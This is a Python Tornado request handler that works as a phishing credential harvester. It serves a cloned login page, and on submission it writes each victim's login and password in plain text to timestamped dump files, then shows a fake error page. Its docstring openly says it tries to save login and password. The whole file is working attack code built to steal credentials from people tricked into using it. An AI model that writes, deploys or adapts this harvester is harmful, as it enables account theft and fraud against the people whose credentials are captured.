# -*- coding: utf-8 -*-

import os
import time
from tornado import web


class MainHandler(web.RequestHandler):
    """MainHandler handle root and unknown endpoints

    GET give the index page
    POST try to save login and password and send the error page
    """
    def initialize(self, page_path: str = ''):
        # TODO doc
        self.page_path = page_path
        self.index_file_path = os.path.join('./pages/' + self.page_path, 'index.html')
        self.error_file_path = os.path.join('./pages/' + self.page_path, 'error.html')
        self.dump_path = os.path.join('../logs/dump/', self.page_path)

    @web.asynchronous
    async def get(self):
        # TODO doc
        with open(self.index_file_path, mode='r', encoding='UTF-8') as page:
            self.write(page.read())

    def post(self):
        # TODO doc
        try:
            login = self.get_argument('login')
            password = self.get_argument('password')
            try:
                if not os.path.exists(self.dump_path):
                    if not os.path.exists('../logs/dump'):
                        if not os.path.exists('../logs'):
                            os.mkdir('../logs')
                        os.mkdir('../logs/dump')
                    os.mkdir(self.dump_path)
                fichier_dump = os.path.join(self.dump_path, str(time.time()))
                with open(fichier_dump, mode='a+', encoding='UTF-8') as file:
                    file.write('login:' + login + '\npassword:' + password + '\n')
            except IOError:
                print(self.page_path, ';login:[', login, '];password:[', password, ']')
        except web.HTTPError:   # no or wrong arguments
            pass
        # show an error page to the client
        with open(self.error_file_path, mode='r', encoding='UTF-8') as page:
            self.write(page.read())
